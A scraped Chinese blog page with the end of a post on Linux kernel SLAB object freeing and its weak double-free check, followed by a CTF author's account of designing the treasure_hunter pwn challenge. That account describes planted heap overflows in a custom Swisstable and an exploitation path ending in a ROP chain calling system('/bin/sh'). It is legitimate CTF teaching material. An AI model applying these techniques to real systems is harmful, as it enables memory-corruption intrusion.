Use KCSAN to help debug racy use-after-free. */</span></span><br><span class="line">	<span class="keyword">if</span> (!(cachep-&gt;flags &amp; SLAB_TYPESAFE_BY_RCU))</span><br><span class="line">		__kcsan_check_access(objp, cachep-&gt;object_size,</span><br><span class="line">				     KCSAN_ACCESS_WRITE | KCSAN_ACCESS_ASSERT);</span><br><span class="line"></span><br><span class="line">	___cache_free(cachep, objp, caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> ___cache_free(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span> =</span> cpu_cache_get(cachep);</span><br><span class="line"></span><br><span class="line">	check_irq_off();</span><br><span class="line">	kmemleak_free_recursive(objp, cachep-&gt;flags);</span><br><span class="line">	objp = cache_free_debugcheck(cachep, objp, caller);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Skip calling cache_free_alien() when the platform is not numa.</span></span><br><span class="line"><span class="comment">	 * This will avoid cache misses that happen while accessing slabp (which</span></span><br><span class="line"><span class="comment">	 * is per page memory  reference) to get nodeid. Instead use a global</span></span><br><span class="line"><span class="comment">	 * variable to skip the call, which is mostly likely to be present in</span></span><br><span class="line"><span class="comment">	 * the cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (nr_online_nodes &gt; <span class="number">1</span> &amp;&amp; cache_free_alien(cachep, objp))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ac-&gt;avail &lt; ac-&gt;limit) &#123;</span><br><span class="line">		STATS_INC_FREEHIT(cachep);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		STATS_INC_FREEMISS(cachep);</span><br><span class="line">		cache_flusharray(cachep, ac);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks()) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span> =</span> virt_to_slab(objp);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (unlikely(slab_test_pfmemalloc(slab))) &#123;</span><br><span class="line">			cache_free_pfmemalloc(cachep, slab, objp);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__free_one(ac, objp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>kfree</code>中首先要找到要被释放的对象所属的<code>kmem_cache</code>。在<code>__cache_free</code>中有一些有关kasan的钩子函数等，用于对释放的对象进行隔离等操作，这里忽略。</p>
<p>直接跟踪来到<code>___cache_free</code>。这里有关键的判断：<code>ac-&gt;avail &lt; ac-&gt;limit</code>，如果条件为真，则表示CPU专属空闲对象链表还有可以存放对象的空间，就可以直接调用<code>__free_one</code>。如果为假，则需要首先调用<code>cache_flusharray</code>对数组进行清理。</p>
<h1 id="__free_one"><a class="markdownIt-Anchor" href="#__free_one"></a> __free_one</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &amp;alien-&gt;lock must be held by alien callers. */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> __free_one(<span class="keyword">struct</span> array_cache *ac, <span class="type">void</span> *objp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Avoid trivial double-free. */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ENABLED(CONFIG_SLAB_FREELIST_HARDENED) &amp;&amp;</span><br><span class="line">	    WARN_ON_ONCE(ac-&gt;avail &gt; <span class="number">0</span> &amp;&amp; ac-&gt;entry[ac-&gt;avail - <span class="number">1</span>] == objp))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	ac-&gt;entry[ac-&gt;avail++] = objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的逻辑就很简单了，更新avail，添加对象即可。在此之前有对于double free的检查。但这里的double free检查不严格，仅仅检查了上一个free到这个数组的对象是否也是这个对象。如果这个对象第一次free后又有其他对象被free到了这里，那么这里的double free检查会报假阳性。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/" class="post-title-link" itemprop="url">L3HCTF命题记事</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-02-04 23:35:03" itemprop="dateCreated datePublished" datetime="2024-02-04T23:35:03+08:00">2024-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-02-06 10:31:03" itemprop="dateModified" datetime="2024-02-06T10:31:03+08:00">2024-02-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E6%83%B3/" itemprop="url" rel="index"><span itemprop="name">随想</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在我写这篇博客的时候，L3HCTF还有不足10个小时结束。这也是我第一次为一场正规的，全国及以上范围的CTF比赛命题。</p>
<p>当队长将pwn方向的命题管理权交给我时，我实际上是心虚的。要说pwn，我也学了两年多了，我真的是一名有水平、有实力的pwn选手吗，还是一个只能靠那些队内研究生元老大杀四方来蹭到决赛机会的CTF寄生虫呢。从目前来看，我似乎更像后者一些。每逢比赛，只有看到一些熟悉的，自己仔细分析过的赛题类型才敢去做，才敢尝试，且不一定能够尝试成功；而对于那些较为陌生的东西，则是避之不及，连查资料的时间也不愿意去花。</p>
<p>而当我命题结束时，我想清楚了一件事。一成不变，不愿接触新事物的选手，无论如何都无法取得真正的成就。你永远都不可能记得所有Linux常用命令的所有用法，解题本身不是一个对已有知识的复制粘贴，而更多的是将已知与未知相结合，并通过赛题本身学到更多的东西。</p>
<p>扯远了，说回命题。</p>
<p>本次L3HCTF的4道pwn题中，我命题的只有1道——treasure_hunter。它的灵感来源于我前段时间的Rust逆向学习上。我本来的打算，是通过对Rust二进制程序进行分析，同时提升自己对Rust语言以及Rust程序逆向的理解。这是一门优雅的语言，值得我细细品味。</p>
<p>在我接触到Rust的Hashmap时，我真正地尝到了一丝逆向的苦头。一开始，我并不知道Rust基于Swisstable实现Hashmap，只是想着通过纯逆向搞清楚其中的逻辑。但经过了长时间的尝试后，我发现这很难。于是我抱着碰一碰运气的心态，随便找了一些Rust源码中Hashmap底层的函数名放到网上查，居然一查就出现了想要的结果，我的理解进程大幅加快。</p>
<p>但在查资料的过程中，我也发现，网络中对于这个新型高效的Hashmap数据结构并没有太多的分析，有较为完整的介绍博客，但数量很少。因此，我萌生了以Swisstable为主题命题的想法，让更多选手了解这个数据结构以及相关的算法。</p>
<p>最初，我计划出的是Rust pwn，以Rust语言现成的Swisstable模板出题，这样更加方便。但出题过程中我发现，Rust语言是一个天生不适合出pwn题的语言，一些C/CPP中习以为常的内存操作却必须使用Unsafe包裹，很是不优雅，因此仅尝试了一小段时间后我就放弃了Rust pwn这个想法，转而想使用CPP手搓一个简易的Swisstable。这样埋设漏洞更加方便。当然，这样也就意味着我的工作量大大提高。好在，在牺牲了一些低耦合与灵活性的情况下，我还是成功完成了数据结构的构建。</p>
<p>在题目框架完成之后，下一步就需要考虑赛题应该使用什么漏洞利用方式了。由于数据结构本身比较复杂，如果需要使用一些利用条件较为苛刻的利用方式，无疑对解题者来说是一个身体和心理上的双重折磨，此类问题也是我最为深恶痛绝的，因此我决定将漏洞点设置地简单一些，但又让选手绕不开Swisstable这个数据结构本身，这样的话，解题体验应该会好很多吧。（另外做过题的选手应该都知道，我在最终给出的ELF文件中没有去除符号表，这实际上一方面暗示了本题的考点，另一方面省去了一些令人抓狂的逆向环节。事实证明，即使如此解出的队伍数量也不超过20，符合最终的难度预期）（笑）</p>
<p>在经历了两届招新赛和本次L3HCTF后，我发现我实际上是有自己的出题风格的。我喜欢将题目本身置于一个真实的场景之中，让选手解题时能够身临其境（笑）。本题也是如此，创建了一个挖宝的场景，并通过该场景中可能出现的经典元素作为本题的关键内容。本题的漏洞点实际上很简单，第一个是一个10字节的溢出，我还特意在堆的最低地址处塞了一个0x400的chunk，这样选手可以通过这个溢出修改Swisstable内部的指针，对内部的数据结构进行伪造，从而达到攻击效果。另外如果选手攒够了足够的金币，可以以一个较低的价格“买到”修改control bytes的机会以及Hashmap的地址。这也是第二个漏洞点，选手可以通过这个漏洞点，与第一个漏洞点配合完成若干次任意地址的读写。最终我的exp中就是通过任意地址读写直接修改栈上的返回地址，构造一个短的ROP链完成控制流劫持。</p>
<p>所以总的来说，本题如果除去Swisstable不看，实际上一个很简单的赛题，没有用到对glibc堆的任何house。因此本题非常考验选手对Swisstable数据结构的理解，否则将无法通过其完成读写操作。这也是我认为我出题出的不好的一点，没有完全贯彻“将已知和未知相结合”的理念。</p>
<p>行了不废话了，下面贴出本题的源码。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/hashmap.h">hashmap.h</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/hashmap.cpp">hashmap.cpp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/main.cpp">main.cpp</a></p>
<p>下面是本题的出题人版本exp以及Dockerfile等一些配置文件。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/exp.py">exp.py</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/Dockerfile">Dockerfile</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/service.sh">service.sh</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/start_docker.sh">start_docker.sh</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/pwn.xinetd">pwn.xinetd</a></p>
<p>我的思路是，首先把所有能挖的金币全挖出来，然后买到hashmap地址。由于本题的堆环境比较固定，可以通过这个hashmap地址获取到其他chunk的地址，通过固定偏移实现。随后我们通过将最开始的0x400的chunk分配出来（后面就是hashmap的chunk），通过10字节溢出将存放数据的指针进行修改，修改到我们伪造的地址中去，在exp中，伪造的数组在0x400中进行构造。由于hashmap没有检查边界，所以伪造后可以实现最多0x1C字节任意地址读。本题的挖矿区域是由mmap分配的，调试时可以看到这块空间位于ld.so的正下方，因此考虑可以在ld.so中寻找合适的偏移来泄露栈地址、libc地址等关键地址。这一步在正式比赛过程中成为了出题人的噩梦，因为我发现远程环境的偏移不一样，虽然说也可以通过爆破的方式通过多次连接完成多个字节的读写，但是这样会大大破坏做题的体验，因此比赛时不得不在队内服务器又部署了一份正常的然后端口映射到平台的端口，这也是为什么treasure_hunter在第一天不太稳定。（在此磕头谢罪砰砰砰）</p>
<p>在获取到关键地址之后，我们再一次分配那个最开始的0x400地址，准备开始写ROP chain。不过由于一开始我们并不知道返回值那个地方保存了什么值，所以需要首先读取然后通过加减金币完成写操作。出题人脚本里面是写入了一个pop rdi, ret ; addrof /bin/sh ; system这样一个简单的ROP chain，由于本题hashmap的大小为0x20，在不扩展的情况下最多可以读写0x1C个字节（0x1C这个数字怎么来的呢，这个就是Rust Swisstable的一个实现，Swisstable在填满7/8空间时就会进行扩展），足够完成这样一个ROP chain的编写。（审wp补档：看到了好几队都是通过写_IO_list_all来打fsop的，这种攻击方式我认为是更加出色的）</p>
<p>以上就是本题的做题流程。说实话我感觉这题出的还是不太好，有种强迫选手学Swisstable的感觉。但好在这也是迈出了第一步。后面的话还是要多接触一些好题，多学一些东西，向L3H大手子之路继续迈进。也非常感谢各位选手的包容以及评价。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">156</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">1.4m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">21:44</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
